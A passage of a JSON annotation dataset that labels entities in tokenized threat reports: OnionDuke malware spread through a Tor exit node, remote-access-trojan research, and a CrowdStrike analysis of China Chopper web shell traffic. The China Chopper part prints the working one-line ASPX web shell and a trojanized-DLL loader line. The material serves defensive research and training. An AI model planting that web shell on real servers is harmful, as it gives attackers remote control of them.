"were", "written", "in", "Delphi", ".", "This", "gave", "the", "RATs", "some"], ["resilience", "against", "classical", "security", "mistakes", "(buffer/heap", "overflows)", "that", "are"], ["much", "easier", "to", "make", "in", "a", "language", "like", "C", "or", "C++", ".", "However", ",", "we", "still", "found"], ["serious", "vulnerabilities", "in", "DarkComet", ",", "which", "was", "the", "most", "widely", "deployed", "of"], ["the", "RATs", "we", "studied", ".", "Our", "analysis", "of", "the", "communications", "should", "provide", "a"], ["solid", "foundation", "for", "other", "researchers", "interested", "in", "further", "reverse", "engineering"], ["and", "vulnerability", "research", "on", "RATs", "."], ["Some", "notable", "coincidences", "in", "behaviors", "between", "RATs", "(use", "of", "Delphi", ",", "using"], ["the", "\u201c|\u201d", "character", "as", "a", "separator", ",", "similar", "UIs", ",", "use", "of", "zlib", ",", "use", "of", "RC4", ",", "and", "other"], ["protocol", "similarities)", "may", "suggest", "shared", "code", ",", "although", "we", "do", "not", "have"], ["enough", "evidence", "to", "make", "any", "definitive", "statements", "on", "that", "subject", "."], ["Special", "thanks", "to", "John", "Villamil", "(@day6reak)", "for", "his", "guidance", "and"], ["knowledge", "on", "this", "project", ",", "and", "to", "the", "rest", "of", "the", "Matasano", "Security", "team", "!"], ["\u00a9", "Copyright", "2012", "Matasano", "Security", "."], ["All", "rights", "reserved", "."]]}], [{"vertexSet": [{"old_id": "T1", "type": "Malware", "name": "OnionDuke", "sent_id": 0, "pos": []}, {"old_id": "T2", "type": "Country", "name": "Russia", "sent_id": 2, "pos": [13]}, {"old_id": "T3", "type": "MalwareFamily", "name": "MiniDuke", "sent_id": 5, "pos": [19]}, {"old_id": "T4", "type": "ExploitTargetObject", "name": "NATO", "sent_id": 6, "pos": [8]}, {"old_id": "T5", "type": "ExploitTargetObject", "name": "European government agencies", "sent_id": 6, "pos": [10, 12]}, {"old_id": "T6", "type": "Malware", "name": "MiniDuke", "sent_id": 7, "pos": [12]}, {"old_id": "T7", "type": "MalwareFamily", "name": "OnionDuke", "sent_id": 8, "pos": [7]}, {"old_id": "T8", "type": "SHA-1", "name": "a75995f94854dea8799650a2f4a97980b71199d2", "sent_id": 15, "pos": [8]}, {"old_id": "T9", "type": "Dropper", "name": "Trojan-Dropper:W32/OnionDukeA", "sent_id": 16, "pos": []}, {"old_id": "T10", "type": "Payload", "name": "Backdoor:W32/OnionDukeB", "sent_id": 22, "pos": []}, {"old_id": "T11", "type": "SHA-1", "name": "b491c14d8cfb48636f6095b7b16555e9a575d57f", "sent_id": 21, "pos": [7]}, {"old_id": "T12", "type": "MalwareFamily", "name": "OnionDuke", "sent_id": 28, "pos": [16]}, {"old_id": "T13", "type": "SHA-1", "name": "d433f281cf56015941a1c2cb87066ca62ea1db37", "sent_id": 36, "pos": [0]}, {"old_id": "T14", "type": "Malware", "name": "Backdoor:W32/OnionDukeA", "sent_id": 36, "pos": []}, {"old_id": "T15", "type": "Indicator", "name": "overpictcom", "sent_id": 37, "pos": []}, {"old_id": "T16", "type": "Indicator", "name": "overpictcom", "sent_id": 39, "pos": []}, {"old_id": "T17", "type": "Attacker", "name": "John Kasai", "sent_id": 39, "pos": []}, {"old_id": "T18", "type": "Time", "name": "2011", "sent_id": 39, "pos": [12]}, {"old_id": "T19", "type": "Attacker", "name": "John Kasai", "sent_id": 40, "pos": []}, {"old_id": "T20", "type": "Indicator", "name": "airtravelabroadcom", "sent_id": 40, "pos": []}, {"old_id": "T21", "type": "Indicator", "name": "beijingnewsblognet", "sent_id": 41, "pos": []}, {"old_id": "T22", "type": "Indicator", "name": "grouptumblercom", "sent_id": 41, "pos": []}, {"old_id": "T23", "type": "Indicator", "name": "leveldeltacom", "sent_id": 41, "pos": []}, {"old_id": "T24", "type": "Indicator", "name": "nasdaqblognet", "sent_id": 41, "pos": []}, {"old_id": "T25", "type": "Indicator", "name": "natureinhomecom", "sent_id": 41, "pos": []}, {"old_id": "T26", "type": "Indicator", "name": "nestedmailcom", "sent_id": 42, "pos": []}, {"old_id": "T27", "type": "Indicator", "name": "nostressjobcom", "sent_id": 42, "pos": []}, {"old_id": "T28", "type": "Indicator", "name": "nytunioncom", "sent_id": 42, "pos": []}, {"old_id": "T29", "type": "Indicator", "name": "oilnewsblogcom", "sent_id": 42, "pos": []}, {"old_id": "T30", "type": "Indicator", "name": "sixsquarenet", "sent_id": 42, "pos": []}, {"old_id": "T31", "type": "Indicator", "name": "ustradecompcom", "sent_id": 42, "pos": []}, {"old_id": "T32", "type": "Indicator", "name": "leveldeltacom", "sent_id": 43, "pos": []}, {"old_id": "T33", "type": "Indicator", "name": "grouptumblercom", "sent_id": 43, "pos": []}, {"old_id": "T34", "type": "MalwareFamily", "name": "MiniDuke", "sent_id": 44, "pos": [6]}, {"old_id": "T35", "type": "MalwareFamily", "name": "OnionDuke", "sent_id": 44, "pos": [13]}, {"old_id": "T36", "type": "MalwareFamily", "name": "MiniDuke", "sent_id": 45, "pos": [0]}, {"old_id": "T37", "type": "MalwareFamily", "name": "OnionDuke", "sent_id": 47, "pos": [7]}, {"old_id": "T38", "type": "MalwareFamily", "name": "MiniDuke", "sent_id": 47, "pos": [9]}, {"old_id": "T39", "type": "MalwareFamily", "name": "OnionDuke", "sent_id": 49, "pos": [0]}, {"old_id": "T40", "type": "Time", "name": "October 2013", "sent_id": 49, "pos": [13, 14]}, {"old_id": "T41", "type": "Time", "name": "February of 2014", "sent_id": 50, "pos": [10, 12]}, {"old_id": "T42", "type": "MalwareFamily", "name": "OnionDuke", "sent_id": 50, "pos": [14]}, {"old_id": "T43", "type": "MalwareFamily", "name": "OnionDuke", "sent_id": 52, "pos": [10]}, {"old_id": "T44", "type": "MalwareFamily", "name": "OnionDuke", "sent_id": 56, "pos": [12]}, {"old_id": "T45", "type": "CourseOfAction", "name": "VPNs", "sent_id": 64, "pos": [20]}, {"old_id": "T46", "type": "MD5", "name": "a75995f94854dea8799650a2f4a97980b71199d2", "sent_id": 68, "pos": [1]}, {"old_id": "T47", "type": "MD5", "name": "b491c14d8cfb48636f6095b7b16555e9a575d57f", "sent_id": 69, "pos": [1]}, {"old_id": "T48", "type": "MD5", "name": "d433f281cf56015941a1c2cb87066ca62ea1db37", "sent_id": 70, "pos": [1]}, {"old_id": "T49", "type": "Dropper", "name": "Trojan-Dropper:W32/OnionDukeA", "sent_id": 71, "pos": []}, {"old_id": "T50", "type": "Malware", "name": "Backdoor:W32/OnionDukeA", "sent_id": 71, "pos": []}, {"old_id": "T51", "type": "Malware", "name": "Backdoor:W32/OnionDukeB", "sent_id": 72, "pos": []}], "labels": [{"old_id": "R1", "r": "P16", "h": 6, "t": 8, "evidence": [8, 9, 10, 11, 12, 13, 14, 15, 16]}, {"old_id": "R2", "r": "P32", "h": 8, "t": 1, "evidence": []}, {"old_id": "R3", "r": "P21", "h": 10, "t": 8, "evidence": []}, {"old_id": "R4", "r": "P13", "h": 8, "t": 9, "evidence": [16, 17, 18, 19, 20, 21, 22]}, {"old_id": "R5", "r": "P21", "h": 12, "t": 13, "evidence": [36]}, {"old_id": "R6", "r": "P14", "h": 13, "t": 11, "evidence": []}, {"old_id": "R7", "r": "P21", "h": 14, "t": 13, "evidence": []}, {"old_id": "R8", "r": "P21", "h": 15, "t": 13, "evidence": []}, {"old_id": "R9", "r": "P23", "h": 16, "t": 13, "evidence": []}, {"old_id": "R10", "r": "P21", "h": 47, "t": 48, "evidence": [70, 71]}, {"old_id": "R11", "r": "P21", "h": 46, "t": 48, "evidence": [69, 70, 71]}, {"old_id": "R12", "r": "P21", "h": 45, "t": 48, "evidence": [68, 69, 70, 71]}, {"old_id": "R13", "r": "P16", "h": 43, "t": 48, "evidence": [56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71]}, {"old_id": "R14", "r": "P16", "h": 43, "t": 49, "evidence": [56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71]}, {"old_id": "R15", "r": "P16", "h": 43, "t": 50, "evidence": [56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72]}], "title": ["inputs/txt/201411FSecureOnionDuke"], "sents": [["OnionDuke:", "APT", "Attacks", "Via", "the", "Tor", "Network", "-", "F-Secure", "Weblog", ":"], ["News", "from", "the", "Lab"], ["Recently", ",", "research", "was", "published", "identifying", "a", "Tor", "exit", "node", ",", "located", "in", "Russia", ",", "that", "was", "consistently", "and"], ["maliciously", "modifying", "any", "uncompressed", "Windows", "executables", "downloaded", "through", "it", ".", "Naturally", "this"], ["piqued", "our", "interest", ",", "so", "we", "decided", "to", "peer", "down", "the", "rabbit", "hole", ".", "Suffice", "to", "say", ",", "the", "hole", "was", "a", "lot", "deeper"], ["than", "we", "expected", "!", "In", "fact", ",", "it", "went", "all", "the", "way", "back", "to", "the", "notorious", "Russian", "APT", "family", "MiniDuke", ",", "known"], ["to", "have", "been", "used", "in", "targeted", "attacks", "against", "NATO", "and", "European", "government", "agencies", ".", "The", "malware"], ["used", "in", "this", "case", "is", ",", "however", ",", "not", "a", "version", "of", "MiniDuke", ".", "It", "is", "instead", "a", "separate", ",", "distinct", "family", "of", "malware"], ["that", "we", "have", "since", "taken", "to", "calling", "OnionDuke", ".", "But", "lets", "start", "from", "the", "beginning", "."], ["When", "a", "user", "attempts", "to", "download", "an", "executable", "via", "the", "malicious", "Tor", "exit", "node", ",", "what", "they", "actually"], ["receive", "is", "an", "executable", "\"wrapper\"", "that", "embeds", "both", "the", "original", "executable", "and", "a", "second", ",", "malicious"], ["executable", ".", "By", "using", "a", "separate", "wrapper", ",", "the", "malicious", "actors", "are", "able", "to", "bypass", "any", "integrity", "checks", "the"], ["original", "binary", "might", "contain", ".", "Upon", "execution", ",", "the", "wrapper", "will", "proceed", "to", "write", "to", "disk", "and", "execute", "the"], ["original", "executable", ",", "thereby", "tricking", "the", "user", "into", "believing", "that", "everything", "went", "fine", ".", "However", ",", "the"], ["wrapper", "will", "also", "write", "to", "disk", "and", "execute", "the", "second", "executable", ".", "In", "all", "the", "cases", "we", "have", "observed", ",", "this"], ["malicious", "executable", "has", "been", "the", "same", "binary", "(SHA1:", "a75995f94854dea8799650a2f4a97980b71199d2", ","], ["detected", "as", "Trojan-Dropper:W32/OnionDuke", ".", "A).", "This", "executable", "is", "a", "dropper", "containing", "a", "PE"], ["resource", "that", "pretends", "to", "be", "an", "embedded", "GIF", "image", "file", ".", "In", "reality", ",", "the", "resource", "is", "actually", "an", "encrypted"], ["dynamically", "linked", "library", "(DLL)", "file", ".", "The", "dropper", "will", "proceed", "to", "decrypt", "this", "DLL", ",", "write", "it", "to", "disk", "and"], ["execute", "it", "."], ["A", "flowchart", "of", "the", "infection", "process"], ["Once", "executed", ",", "the", "DLL", "file", "(SHA1:", "b491c14d8cfb48636f6095b7b16555e9a575d57f", ",", "detected", "as"], ["Backdoor:W32/OnionDuke", ".", "B)", "will", "decrypt", "an", "embedded", "configuration", "(shown", "below)", "and", "attempt", "to"], ["connect", "to", "hardcoded", "C&C", "URLs", "specified", "in", "the", "configuration", "data", ".", "From", "these", "C&Cs", "the", "malware", "may"], ["receive", "instructions", "to", "download", "and", "execute", "additional", "malicious", "components", ".", "It", "should", "be", "noted", ",", "that"], ["we", "believe", "all", "five", "domains", "contacted", "by", "the", "malware", "are", "innocent", "websites", "compromised", "by", "the", "malware"], ["operators", ",", "not", "dedicated", "malicious", "servers", "."], ["A", "screenshot", "of", "the", "embedded", "configuration", "data"], ["Through", "our", "research", ",", "we", "have", "also", "been", "able", "to", "identify", "multiple", "other", "components", "of", "the", "OnionDuke"], ["malware", "family", ".", "We", "have", ",", "for", "instance", ",", "observed", "components", "dedicated", "to", "stealing", "login", "credentials", "from"], ["the", "victim", "machine", "and", "components", "dedicated", "to", "gathering", "further", "information", "on", "the", "compromised"], ["system", "like", "the", "presence", "of", "antivirus", "software", "or", "a", "firewall", ".", "Some", "of", "these", "components", "have", "been", "observed"], ["being", "downloaded", "and", "executed", "by", "the", "original", "backdoor", "process", "but", "for", "other", "components", ",", "we", "have", "yet", "to"], ["identify", "the", "infection", "vector", ".", "Most", "of", "these", "components", "don't", "embed", "their", "own", "C&C", "information", "but"], ["rather", "communicate", "with", "their", "controllers", "through", "the", "original", "backdoor", "process", "."], ["One", "component", ",", "however", ",", "is", "an", "interesting", "exception", ".", "This", "DLL", "file", "(SHA1"], ["d433f281cf56015941a1c2cb87066ca62ea1db37", ",", "detected", "as", "Backdoor:W32/OnionDuke", ".", "A)", "contains"], ["among", "its", "configuration", "data", "a", "different", "hardcoded", "C&C", "domain", ",", "overpict", ".", "com", "and", "also", "evidence"], ["suggesting", "that", "this", "component", "may", "abuse", "Twitter", "as", "an", "additional", "C&C", "channel", ".", "What", "makes", "the"], ["overpict", ".", "com", "domain", "interesting", ",", "is", "it", "was", "originally", "registered", "in", "2011", "with", "the", "alias", "of", "\"John", "Kasai\"", "."], ["Within", "a", "two-week", "window", ",", "\"John", "Kasai\"", "also", "registered", "the", "following", "domains:", "airtravelabroad", ".", "com,"], ["beijingnewsblog", ".", "net,", "grouptumbler", ".", "com,", "leveldelta", ".", "com,", "nasdaqblog", ".", "net,", "natureinhome", ".", "com,"], ["nestedmail", ".", "com,", "nostressjob", ".", "com,", "nytunion", ".", "com,", "oilnewsblog", ".", "com,", "sixsquare", ".", "net", "and", "ustradecomp", ".", "com."], ["This", "is", "significant", "because", "the", "domains", "leveldelta", ".", "com", "and", "grouptumbler", ".", "com", "have", "previously", "been"], ["identified", "as", "C&C", "domains", "used", "by", "MiniDuke", ".", "This", "strongly", "suggests", "that", "although", "OnionDuke", "and"], ["MiniDuke", "are", "two", "separate", "families", "of", "malware", ",", "the", "actors", "behind", "them", "are", "connected", "through", "the", "use", "of"], ["shared", "infrastructure", "."], ["A", "visualization", "of", "the", "infrastructure", "shared", "between", "OnionDuke", "and", "MiniDuke"], ["Based", "on", "compilation", "timestamps", "and", "discovery", "dates", "of", "samples", "we", "have", "observed", ",", "we", "believe", "the"], ["OnionDuke", "operators", "have", "been", "infecting", "downloaded", "executables", "at", "least", "since", "the", "end", "of", "October", "2013", "."], ["We", "also", "have", "evidence", "suggesting", "that", ",", "at", "least", "since", "February", "of", "2014", ",", "OnionDuke", "has", "not", "only", "been"], ["spread", "by", "modifying", "downloaded", "executables", "but", "also", "by", "infecting", "executables", "in", "", ".", "torrent", "files", "containing"], ["pirated", "software", ".", "However", ",", "it", "would", "seem", "that", "the", "OnionDuke", "family", "is", "much", "older", ",", "both", "based", "on", "older"], ["compilation", "timestamps", "and", "also", "on", "the", "fact", "that", "some", "of", "the", "embedded", "configuration", "data", "make"], ["reference", "to", "an", "apparent", "version", "number", "of", "4", "suggesting", "that", "at", "least", "three", "earlier", "versions", "of", "the", "family"], ["exist", "."], ["During", "our", "research", ",", "we", "have", "also", "uncovered", "strong", "evidence", "suggesting", "that", "OnionDuke", "has", "been", "used", "in"], ["targeted", "attacks", "against", "European", "government", "agencies", ",", "although", "we", "have", "so", "far", "been", "unable", "to", "identify"], ["the", "infection", "vector(s)", ".", "Interestingly", ",", "this", "would", "suggest", "two", "very", "different", "targeting", "strategies", ".", "On", "one"], ["hand", "is", "the", "\"shooting", "a", "fly", "with", "a", "cannon\"", "mass-infection", "strategy", "through", "modified", "binaries", "and", ",", "on", "the"], ["other", ",", "the", "more", "surgical", "targeting", "traditionally", "associated", "with", "APT", "operations", "."], ["In", "any", "case", ",", "although", "much", "is", "still", "shrouded", "in", "mystery", "and", "speculation", ",", "one", "thing", "is", "certain", ".", "While", "using"], ["Tor", "may", "help", "you", "stay", "anonymous", ",", "it", "does", "at", "the", "same", "time", "paint", "a", "huge", "target", "on", "your", "back", ".", "It's", "never", "a"], ["good", "idea", "to", "download", "binaries", "via", "Tor", "(or", "anything", "else)", "without", "encryption", ".", "The", "problem", "with", "Tor", "is"], ["that", "you", "have", "no", "idea", "who", "is", "maintaining", "the", "exit", "node", "you", "are", "using", "and", "what", "their", "motives", "are", ".", "VPNs"], ["(such", "as", "our", "Freedome", "VPN)", "will", "encrypt", "your", "connection", "all", "the", "way", "through", "the", "Tor", "network", ",", "so", "the"], ["maintainers", "of", "Tor", "exit", "nodes", "will", "not", "see", "your", "traffic", "and", "can't", "tamper", "with", "it", "."], ["Samples:"], ["\u2022", "a75995f94854dea8799650a2f4a97980b71199d2"], ["\u2022", "b491c14d8cfb48636f6095b7b16555e9a575d57f"], ["\u2022", "d433f281cf56015941a1c2cb87066ca62ea1db37"], ["Detected", "as:", "Trojan-Dropper:W32/OnionDuke", ".", "A,", "Backdoor:W32/OnionDuke", ".", "A,", "and"], ["Backdoor:W32/OnionDuke", ".", "B."], ["Post", "by", "\u2014", "Artturi", "(@lehtior2)"]]}], [{"vertexSet": [{"old_id": "T1", "type": "Malware", "name": "China Chopper", "sent_id": 0, "pos": [3, 4]}, {"old_id": "T2", "type": "Time", "name": "30 MAR 2015", "sent_id": 3, "pos": [0, 2]}, {"old_id": "T3", "type": "Person", "name": "WILLIAM TAN", "sent_id": 4, "pos": [0, 1]}, {"old_id": "T4", "type": "Malware", "name": "Chopper Web shell", "sent_id": 6, "pos": [1, 3]}, {"old_id": "T5", "type": "Payload", "name": "<%@ Page Language=\"Jscript\"%><%eval(RequestItem[\u201dpassword\"]\"unsafe\");%>", "sent_id": 9, "pos": []}, {"old_id": "T6", "type": "Organization", "name": "CrowdStrike", "sent_id": 12, "pos": [0]}, {"old_id": "T7", "type": "Dropper", "name": "SystemWebServicesdll", "sent_id": 13, "pos": []}, {"old_id": "T8", "type": "Payload", "name": "<% WebServicesInitalizeWebServices (\"shell_password\");%>", "sent_id": 16, "pos": [0, 4]}, {"old_id": "T9", "type": "Malware", "name": "Chopper Web shell", "sent_id": 22, "pos": [1, 3]}, {"old_id": "T10", "type": "Malware", "name": "Chopper", "sent_id": 24, "pos": [1]}, {"old_id": "T11", "type": "Malware", "name": "Chopper", "sent_id": 25, "pos": [12]}, {"old_id": "T12", "type": "Malware", "name": "Chopper", "sent_id": 26, "pos": [10]}, {"old_id": "T13", "type": "Software", "name": "ChopShop", "sent_id": 29, "pos": [8]}, {"old_id": "T14", "type": "Organization", "name": "MITRE", "sent_id": 30, "pos": [0]}, {"old_id": "T15", "type": "Software", "name": "ChopShop", "sent_id": 30, "pos": [5]}, {"old_id": "T16", "type": "Malware", "name": "Chopper", "sent_id": 34, "pos": [1]}, {"old_id": "T17", "type": "Malware", "name": "Chopper", "sent_id": 56, "pos": [10]}, {"old_id": "T18", "type": "Obfuscation", "name": "base64", "sent_id": 60, "pos": [1]}, {"old_id": "T19", "type": "Obfuscation", "name": "hex", "sent_id": 60, "pos": [3]}, {"old_id": "T20", "type": "Malware", "name": "Chopper", "sent_id": 64, "pos": [7]}, {"old_id": "T21", "type": "Malware", "name": "Chopper", "sent_id": 89, "pos": [6]}, {"old_id": "T22", "type": "Malware", "name": "Chopper", "sent_id": 90, "pos": [1]}], "labels": [{"old_id": "R1", "r": "P13", "h": 3, "t": 4, "evidence": [6, 7, 8, 9]}, {"old_id": "R2", "r": "P13", "h": 6, "t": 7, "evidence": [13, 14, 15, 16]}, {"old_id": "R3", "r": "P17", "h": 13, "t": 12, "evidence": []}, {"old_id": "R4", "r": "P13", "h": 16, "t": 17, "evidence": [56, 57, 58, 59, 60]}, {"old_id": "R5", "r": "P13", "h": 16, "t": 18, "evidence": [56, 57, 58, 59, 60]}], "title": ["inputs/txt/201503CrowdStrikeChinaChopper"], "sents": [["Chopping", "packets:", "Decoding", "China", "Chopper", "Web"], ["shell", "traf\ufb01c", "over", "SSL"], ["THE", "FRONT", "LINES", "/", "THE", "TOOL", "BOX"], ["30", "MAR", "2015"], ["WILLIAM", "TAN"], ["INTRODUCTION"], ["The", "Chopper", "Web", "shell", "is", "a", "widely", "used", "backdoor", "by", "Chinese", "and", "other", "malicious", "actors", "to"], ["remotely", "access", "a", "compromised", "Web", "server", ".", "Deployment", "of", "the", "Chopper", "shell", "on", "the", "server", "is"], ["fairly", "basic", "as", "the", "server", "payload", "is", "a", "single", "line", "inserted", "into", "any", "ASPX", "page", "."], ["<%@", "Page", "Language=\"Jscript\"%><%eval(Request", ".", "Item[\u201dpassword\"],\"unsafe\");%>"], ["This", "payload", "is", "available", "in", "a", "variety", "of", "languages", "including", "ASP", ",", "ASPX", ",", "PHP", ",", "JSP", ",", "and", "CFM", "."], ["Once", "installed", ",", "the", "attacker", "can", "access", "the", "shell", "with", "the", "Chopper", "client", "side", "binary", "."], ["CrowdStrike", "has", "observed", "another", "deployment", "method", "on", "IIS", "servers", "where", "attackers", "upload", "a"], ["trojanized", "DLL", "\ufb01le", ",", "\u2018System", ".", "WebServices.dll\u2019.", "This", "DLL", "\ufb01le", "is", "written", "in", "C#", "and", "contains", "multiple"], ["Chopper", "API", "functions", ".", "The", "attacker", "can", "then", "call", "these", "functions", "by", "inserting", "this", "line", "in", "any"], ["ASPX", "page:"], ["<%", "WebServices", ".", "InitalizeWebServices", "(\"shell_password\");%>"], ["The", "attacker", "can", "access", "this", "Web", "shell", "variant", "with", "similar", "methods", ",", "including", "using", "the", "Chopper"], ["client", "side", "binary", ".", "The", "bene\ufb01t", "of", "this", "deployment", "method", "allows", "the", "Web", "shell", "to", "evade", "hostbased", "detection", "methods", "that", "look", "for", "suspicious", "functions", "such", "as", "\u2018eval\u2019", ".", "Although", "deployments"], ["of", "Chopper", "can", "vary", "on", "the", "host", ",", "the", "network", "traf\ufb01c", "patterns", "generated", "by", "the", "Web", "shell", "have"], ["remained", "largely", "unchanged", "."], ["CHOPPER", "NETWORK", "TRAFFIC"], ["The", "Chopper", "Web", "shell", "client", "communicates", "over", "TCP", "using", "HTTP", "POST", "requests", ".", "Network"], ["traf\ufb01c", "analysis", "of", "chopper", "packets", "can", "reveal", "attacker", "actions", ",", "intentions", ",", "and", "next", "steps", "."], ["Because", "Chopper", "generates", "a", "POST", "request", "for", "each", "command", ",", "manual", "analysis", "can", "get"], ["tedious", "if", "the", "attacker", "is", "very", "active", ".", "Another", "challenge", "occurs", "when", "Chopper", "is", "deployed", "on", "a"], ["Web", "server", "behind", "SSL", ",", "causing", "all", "traf\ufb01c", "generated", "by", "Chopper", "to", "be", "encrypted", "."], ["Figure", "1", ".", "Example", "of", "Chopper\u2019s", "encoded", "command", "with", "response", "over", "decrypted", "HTTPs"], ["DECODING", "WITH", "CHOPSHOP"], ["To", "assist", "with", "rapid", "triage", ",", "we", "leverage", "ChopShop", ",", "a", "network", "decoder", "framework", "developed", "by"], ["MITRE", "(https://github", ".", "com/MITRECND/chopshop).", "The", "ChopShop", "framework", "is", "extendable", "with"], ["modules", ",", "and", "the", "output", "from", "each", "module", "can", "be", "chained", ".", "Doing", "so", "reduces", "the", "need", "to", "rewrite"], ["a", "decoder", "for", "widely", "used", "protocols", ".", "This", "allows", "the", "analyst", "to", "focus", "on", "developing", "modules"], ["speci\ufb01c", "to", "a", "family", "of", "malware", "without", "dealing", "with", "the", "underlying", "protocols", "."], ["The", "Chopper", "decode", "module", "I", "have", "written", "for", "the", "ChopShop", "Framework", "is", "designed", "to", "be"], ["chained", "with", "the", "\u2018chop_ssl\u2019", "and", "\u2018http\u2019", "modules", ".", "To", "decode", "SSL", "traf\ufb01c", ",", "the", "\u2018chop_ssl\u2019", "module"], ["requires", "the", "server\u2019s", "private", "key", "in", "RSA", "format", ".", "I\u2019ve", "provided", "an", "initial", "version", "of", "this", "module", "on"], ["our", "Github", "page", "(https://github", ".", "com/CrowdStrike/chopshop)."], ["webshell_chopper_decode", "(0", ".", "1)", "--", "requires", "ChopLib", "4", ".", "0", "or", "greater:"], ["Extract", "Chopper", "Webshell", "commands", "and", "output", "from", "HTTP", "traffic", ".", "Requires", "'http'"], ["parent", "module", "."], ["Usage:", "webshell_chopper_decode", "[options]"], ["Options:"], ["-h", ",", "--help"], ["show", "this", "help", "message", "and", "exit"], ["-d", ",", "--dict_output"], ["Formats", "output", "to", "sets", "of", "dicts"], ["-c", ",", "--commands_only", "Only", "output", "chopper", "commands"], ["-o", ",", "--outputs_only"], ["-x", ",", "--extract_pe"], ["Only", "output", "chopper", "responses"], ["Attempts", "to", "extract", "pe", "files", "from", "session"], ["Sample", "usage", "commands:"], ["", ".", "/chopshop", "\u2013f", "chopper_traffic_ssl", ".", "pcap", "\"chop_ssl", "-k", "privatekeyrsa", ".", "key", "|", "http", "|"], ["webshell_chopper_decode\"", ">", "decoded_commands", ".", "txt"], ["", ".", "/chopshop", "\u2013f", "chopper_traffic_http", ".", "pcap", "\"http", "|", "webshell_chopper_decode", "-c\""], ["The", "module", "output", "contains", "all", "commands", "and", "responses", "from", "the", "Chopper", "shell", ".", "The", "module"], ["will", "decode", "the", "entire", "PCAP", "and", "separate", "the", "each", "command", "parameter", "\u2018z0\u2019", ",", "\u2018z1\u2019", ",", "\u2018z2\u2019", "on", "a"], ["separate", "line", ".", "These", "\u2018z\u2019", "parameters", "in", "the", "form", "data", "contain", "the", "arguments", "to", "commands", "", ",", "which"], ["are", "passed", "from", "the", "Chopper", "client", "to", "the", "server", "payload", ".", "While", "the", "commands", "are", "encoded", "in"], ["either", "base64", "or", "hex", ",", "the", "responses", "are", "not", "encoded", "."], ["In", "the", "sample", "output", "below", ",", "we", "see", "an", "attacker", "running", "a", "\u2018dir\u2019", "command", "\ufb01le", "looking", "for"], ["\u2018w3wp", ".", "exe\u2019", "(a", "renamed", "version", "of", "cmd", ".", "exe)", "and", "subsequently", "executing", "the", "credential", "dumper"], ["\u2018mimikatz\u2019", "(named", "pwd", ".", "txt)."], ["Portable", "executable", "(PE)", "\ufb01les", "used", "by", "the", "Chopper", "Web", "shell", "are", "parsed", "as", "hex", "encoded", "by", "the"], ["module", ".", "The", "Chopper", "decode", "module", "has", "an", "option", "to", "attempt", "to", "carve", "out", "and", "save", "any", "PE", "\ufb01les"], ["in", "the", "commands", "or", "responses", "seen", "during", "an", "attacker\u2019s", "C2", "session", "."], ["", ".", "/chopshop", "-s", "", ".", "\u2013f", "chopper_traffic_ssl", ".", "pcap", "\"chop_ssl", "-k", "privatekeyrsa", ".", "key", "|", "http", "|"], ["webshell_chopper_decode", "\u2013x\""], ["Note", "the", "addition", "of", "the", "\u201c-s\u201d", "\ufb02ag", ",", "which", "needs", "to", "be", "set", "to", "tell", "ChopShop", "which", "directory", "to", "output"], ["saved", "\ufb01les", "."], ["Figure", "2", ".", "Sample", "portion", "of", "output", "from", "decode", "module", "showing", "\u2018mimikatz\u2019", "execution", "."], ["\u2026"], ["chopper_extracted_file-1", ".", "bin", "saved", ".", "."], ["[COMMAND]", "at", "2015-02-24", "07:03:05", "UTC"], ["[Z0", "Parameter]", "-", "Q1|"], ["[Z1", "Parameter]", "\\\\192", ".", "168.1.11\\c$\\inetpub\\wwwroot\\Citrix\\XenApp\\bin\\System.WebServices.dll"], ["[Z2", "Parameter]", "4D5A90000300000004000000FFFF0000B80000000000000040000000000000000000"], ["0000000000000000000000000000000000000000000000000000800000000E1FBA0E"], ["00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F74206265207"], ["2756E20696E20444F53206D6F64652E0D0D0A2400000000000000504500004C0103"], ["00D2963C500000000000000000E00002210B0108000036000000080000000000002"], ["E5500000020000000600000000040000020000000020000040000000000000004000"], ["0000000000000A000000002000000000000030040850000100000100000000010000"], ["010000000000000100000000000000000000000DC5400004F0000000060000008050"], ["00000000000000000000000000000000000008000000C000000445400001C0000000"], ["00000000000000000000000000000000000000000000000000000000000000000000"], ["0000000000000200000080000000\u2026"], ["FINAL", "THOUGHTS"], ["Figure", "3", ".", "Carved", "PE", "from", "Chopper", "traf\ufb01c", "opened", "in", "hex", "editor", "."], ["With", "Chopper", "available", "in", "so", "many", "varieties", "of", "programming", "and", "scripting", "languages", ",", "this", "module"], ["is", "still", "in", "development", "to", "account", "for", "different", "variants", "and", "edge", "cases", ".", "The", "goal", "of", "this", "module"], ["was", "to", "ease", "some", "of", "the", "tediousness", "of", "extracting", "information", "out", "of", "a", "large", "packet", "capture", ".", "With"], ["the", "prevalence", "of", "Chopper\u2019s", "use", "by", "APT", "groups", ",", "being", "able", "to", "quickly", "decode", "and", "understand"], ["what", "an", "attacker", "is", "doing", "greatly", "increases", "the", "situational", "awareness", "of", "incident", "responders", "."], ["REFERENCES"], ["https://github", ".", "com/CrowdStrike/chopshop"], ["https://github", ".", "com/MITRECND/chopshop"], ["https://github", ".", "com/MITRECND/htpy"], ["http://www", ".", "mitre.org/capabilities/cybersecurity/overview/cybersecurity-blog/decrypting-ssl-withchopshop"], ["https://www", ".", "\ufb01reeye.com/content/dam/legacy/resources/pdfs/\ufb01reeye-china-chopper-report.pdf"], ["http://informationonsecurity", ".", "blogspot.com/2012/11/china-chopper-webshell.html"], ["1"], ["8"], ["\u2190", "New", "White", "House", "Executive", "Order:"], ["Sanctions", "in", "Response", "to", "Cyber", "Intrusions"], ["The", "Future", "of", "Privacy", ",", "Data", ",", "and", "Cyber"], ["Crime", "and", "its", "Impact", "on", "the", "American"], ["Business", "Dream", "\u2192"], ["Follow", "Us"], ["Tweets"], ["CrowdStrike"], ["@CrowdStrike"], ["12h"], ["Check", "out", "@media\ufb01shy", "discuss", "the", "future", "of", "AV", "and", "why", "endpoint", "protection", "is"], ["paramount", "ow", ".", "ly/UZ12X", "#cybersecurity", "#infosec"], ["Show", "Media"], ["CrowdStrike"], ["@CrowdStrike"], ["20", "Nov"], ["Check", "out", "@Shawn365Henry's", "security", "tips", "in", "\"The", "Top", "5", "#Cybersecurity", "Mistakes"], ["Companies", "Make", "&", "How", "to", "Avoid", "Them\"", "ow", ".", "ly/USNQD"], ["Expand"], ["Eric", "Opdyke"], ["@EricOpdyke"], ["20", 